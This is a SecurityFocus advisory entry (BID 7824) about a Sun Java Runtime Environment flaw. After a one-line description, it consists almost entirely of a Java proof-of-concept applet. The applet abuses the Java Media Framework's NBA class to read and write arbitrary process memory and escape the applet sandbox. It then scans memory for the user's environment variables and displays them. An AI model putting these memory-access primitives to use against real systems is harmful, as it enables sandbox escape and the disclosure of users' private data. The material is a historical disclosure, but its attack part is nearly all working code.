source: http://www.securityfocus.com/bid/7824/info

It has been reported that the Sun Java Runtime Environment does not properly protect trusted java applets. Because of this, it may be possible for an attacker to use a malicious applet to gain access to sensitive information. 

/*
Proof-Of-Concept: Read Environment via vulnerability Java Media Framework
(2003) Marc Schoenefeld, www.illegalaccess.org

*/

import com.sun.media.NBA;
import java.applet.Applet;
import java.awt.Graphics;
import javax.swing.JOptionPane;
class NBAFactory {

		 		 public static String getEnv(String a,long from, long to) {
		 		 		 long pos = findMem(a,from,to);
		 		 		 String ret = "";
		 		 		 if (pos  != -1) {
		 		 		 		 long pos2 = pos+a.length();
		 		 		 		 ret = getString(pos2);
		 		 		 }
		 		 		 return ret;
		 		 }

		 		 public static String getString(long pos) {
		 		 		 int i = 0;
		 		 		 StringBuffer b = new StringBuffer();
		 		 		 char x = 0;
		 		 		 do {
		 		 		 		 x = (char) readMem(pos+i);
		 		 		 		 i++;
		 		 		 		 if (x != 0)
		 		 		 		 b.append(x);

		 		 		 } while (!(x == 0));
		 		 		 return b.toString();
		 		 }

		 		 public static long findMem(String a, long from , long to)  {
		 		 		 char[] ch = a.toCharArray();
		 		 		 for (long pos = from; pos < to ;pos++) {
//		 		 		 		 System.out.println(pos-from+":");
		 		 		 		 int i = 0;
		 		 		 		 int found = 0;
		 		 		 		 for (i = 0; i < ch.length; i++) {
		 		 		 		 		 char x = (char) readMem(pos+i);
//		 		 		 		 		 System.out.println(pos+":"+x);
		 		 		 		 		 if (x == ch[i]) {
		 		 		 		 		 		 found ++;
		 		 		 		 		 }
		 		 		 		 		 else
		 		 		 		 		    break;
		 		 		 		 }
		 		 		 		 if (found == ch.length) {
		 		 		 		 		 return pos;
		 		 		 		 }
		 		 		 }
		 		 		 return -1;
		 		 }

		 		 public static byte readMem(long i) {
		 		 		 byte[] by = new byte[1];
		 		 		 NBA searcher = new NBA(byte[].class,1);
		 		 		 long olddata = searcher.data;
		 		 		 searcher.data = i;
		 		 		 searcher.size = 1;
		 		 		 searcher.copyTo(by);
		 		 		 searcher.data = olddata; // keep the finalizer happy
		 		 		 return by[0];
		 		 }

		 		 public static void setMem(long i, char c) {
		 		 		 NBA b = new NBA(byte[].class,1);
		 		 		 long olddata = b.data;
		 		 		 b.data = i;
		 		 		 b.size = 1;
		 		 		 theBytes[c].copyTo(b);
		 		 		 b.data  = olddata; // keep the finalizer happy
		 		 }

		 		 public static void setMem(long i, byte by) {
		 		 		 setMem(i,(char) by);
		 		 }


		 		 public static void setMem(long i, int by) {
		 		 		 setMem(i,(char) by);
		 		 }


		 		 public static void setMem(long l, String s) {
		 		 		 char[] theChars = s.toCharArray();
		 		 		 NBA b = new NBA(byte[].class,1);
		 		 		 long olddata = b.data;
		 		 		 for (int i = 0 ; i  < theChars.length; i++) {
		 		 		 		 b.data = l+i;
		 		 		 		 b.size = 1;
		 		 		 		 theBytes[theChars[i]].copyTo(b);
		 		 		 }
		 		 		 b.data  = olddata; // keep the finalizer happy
		 		 }


		 		 private NBAFactory() {
		 		 }
		 		 public static NBA getByte(char i) {
		 		 		 return theBytes[i];
		 		 }

		 		 public static NBA getByte(int i) {
		 		 		 return theBytes[(char) i];
		 		 }

		 		 public static NBA[] getBytes() {
		 		 		 return theBytes;
		 		 }

		 		 static NBA[] theBytes = new NBA[256];
		 		 static {
		 		 		 for (char i = 0; i < 256; i++) {
//		 		 		 		 System.out.println((byte)i);
		 		 		 		 NBA n = search(i,0x6D340000L, 0x6D46A000L);
		 		 		 		 if (n!=null)
		 		 		 		 		 theBytes[i]= n;
		 		 		 		 else
		 		 		 		 		 System.exit(-1);
		 		 		 }
		 		 }

		 		 static NBA search (char theChar,long start, long end) {
		 		 		 NBA ret = null;
		 		 		 NBA searcher = new NBA(byte[].class,1);
		 		 		 byte[] ba = new byte[1];
		 		 		 for (long i = start; i < end ; i++) {
//		 		 		 		 byte b = readMem(i);
		 		 		 		 searcher.data = i;
		 		 		 		 searcher.copyTo(ba);
//		 		 		 		 if ( b == (byte)theChar) {
		 		 		 		 if ( ba[0] == (byte)theChar) {
		 		 		 		 		 return searcher;
		 		 		 		 }
		 		 		 }
		 		 		 return null;
		 		 }
		 }

public class ReadEnv extends Applet{

		 static NBA base = new NBA(byte[].class,18);  // what's the base pointer ?



		 public static void crash(Object o) {

		   System.out.println("Proof-Of-Concept: Read Environment via vulnerability Java Media Framework");

		   System.out.println("(2003) Marc Schoenefeld, www.illegalaccess.org");


		   NBA ret = new NBA(byte[].class,4);
		   long oldret = ret.data;

 		   System.out.println("Base of data: "+Long.toString(base.data,16));

		   String[] envs = {"USERDOMAIN","USERNAME","USERPROFILE","CLASSPATH",
		   		 "TEMP","COMSPEC","JAVA_HOME","Path","INCLUDE"};

		   for (int i = 0; i < envs.length; i++) {
		   		 String val = NBAFactory.getEnv(envs[i],base.data,base.data+32768);
		   		 if (!(o instanceof Applet)) {
		   		 		 System.out.println(envs[i]+":"+val);
		 		 }
		 		 else {
		 		 		 javax.swing.JOptionPane.showMessageDialog((java.applet.Applet) o,envs[i]+":"+val);
		 		 }
		   }


		   //NBAFactory.setMem(pos+10,'A');
		   try {
          System.out.println(System.getProperty("java.class.path"));
		   java.util.Properties p = System.getProperties();

		   p.list(System.out);
		   }
		   catch (java.security.AccessControlException e) {
		   		 System.out.println("Cannot read environment via getProperties:"+e);
		   }

		   //System.out.println(pos);

		   //long pos2 = NBAFactory.findMem("mixed",base.data,base.data+6614096);
		   //System.out.println(pos2);


		   //byte[] x11 = new byte[8];
		   //ret.copyTo(x11);
		   //for (int i = 0; i < x11.length; i++) {
		   //		 System.out.println(i+":"+x11[i]+(char)x11[i]);
		   //}



		   ret.data = oldret;

		   //ret.data = 0xffff8000;

		   //ret.finalize();
		   //ret.finalize();

		   //NBAFactory.setMem(ret.data-0xffff8000,33);


		   //ret.finalize();

		   /*b.data = base.data;
		   b.size = 16384;*/

		   /*byte[] ba3 = new byte[16384];
 		   b.copyTo(ba3);
		   for (int i = 0; i < ba3.length; i++) {
		   		 System.out.println(new Integer(i).toString(i,16)+":"+ba3[i]+(char)ba3[i]);
		   }*/

          /*b.data = olddata;*/



		 }

		 public static void main(String[] a) {
		 		 crash(null);
		 }

		 public void paint(Graphics g) {

		 		 if (init == 0) {
		 		 		 init=1;
		 		 		 crash(this);
		 		 }
		 }

		 static int init = 0;
}